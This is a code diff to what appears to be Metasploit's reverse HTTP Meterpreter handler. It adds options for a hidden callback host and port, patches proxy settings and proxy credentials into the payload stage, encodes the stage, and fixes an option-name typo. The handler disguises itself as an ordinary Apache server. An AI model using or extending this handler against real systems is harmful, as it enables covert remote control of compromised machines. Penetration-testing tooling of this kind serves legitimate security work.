@@ -83,13 +83,21 @@ module ReverseHttp
 	# addresses.
 	#
 	def full_uri
-		lhost = datastore['LHOST']
+		unless datastore['HIDDENHOST'].nil? or datastore['HIDDENHOST'].empty?
+			lhost = datastore['HIDDENHOST']
+		else
+			lhost = datastore['LHOST']
+		end
 		if lhost.empty? or lhost == "0.0.0.0" or lhost == "::"
 			lhost = Rex::Socket.source_address
 		end
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 		scheme = (ssl?) ? "https" : "http"
-		uri = "#{scheme}://#{lhost}:#{datastore["LPORT"]}/"
+		unless datastore['HIDDENPORT'].nil? or datastore['HIDDENPORT'] == 0
+			uri = "#{scheme}://#{lhost}:#{datastore["HIDDENPORT"]}/"
+		else
+			uri = "#{scheme}://#{lhost}:#{datastore["LPORT"]}/"
+		end
 
 		uri
 	end
@@ -155,7 +163,7 @@ module ReverseHttp
 				OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
 				OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
 				OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
-				OptString.new('HttpUknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
+				OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
 			], Msf::Handler::ReverseHttp)
 	end
 
@@ -297,6 +305,42 @@ protected
 					print_status("Patched user-agent at offset #{i}...")
 				end
 
+				# Activate a custom proxy
+				i = blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+				if i
+					if datastore['PROXYHOST']
+						if datastore['PROXYHOST'].to_s != ""
+							proxyhost = datastore['PROXYHOST'].to_s
+							proxyport = datastore['PROXYPORT'].to_s || "8080"
+							proxyinfo = proxyhost + ":" + proxyport
+							if proxyport == "80"
+								proxyinfo = proxyhost
+							end
+							if datastore['PROXY_TYPE'].to_s == 'HTTP'
+								proxyinfo = 'http://' + proxyinfo
+							else #socks
+								proxyinfo = 'socks=' + proxyinfo
+							end
+							proxyinfo << "\x00"
+							blob[i, proxyinfo.length] = proxyinfo
+							print_status("Activated custom proxy #{proxyinfo}, patch at offset #{i}...")
+							#Optional authentification
+							unless 	(datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
+								(datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
+								datastore['PROXY_TYPE'] == 'SOCKS'
+								
+								proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+								proxy_username = datastore['PROXY_USERNAME'] << "\x00"
+								blob[proxy_username_loc, proxy_username.length] = proxy_username
+
+								proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+								proxy_password = datastore['PROXY_PASSWORD'] << "\x00"
+								blob[proxy_password_loc, proxy_password.length] = proxy_password
+							end
+						end
+					end
+				end
+
 				# Replace the transport string first (TRANSPORT_SOCKET_SSL)
 				i = blob.index("METERPRETER_TRANSPORT_SSL")
 				if i
@@ -327,7 +371,7 @@ protected
 				end
 				print_status("Patched Communication Timeout at offset #{i}...")
 
-				resp.body = blob
+				resp.body = encode_stage(blob)
 
 				# Short-circuit the payload's handle_connection processing for create_session
 				create_session(cli, {
@@ -360,7 +404,7 @@ protected
 				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
 				resp.code    = 200
 				resp.message = "OK"
-				resp.body    = datastore['HttpUknownRequestResponse'].to_s
+				resp.body    = datastore['HttpUnknownRequestResponse'].to_s
 		end
 
 		cli.send_response(resp) if (resp)
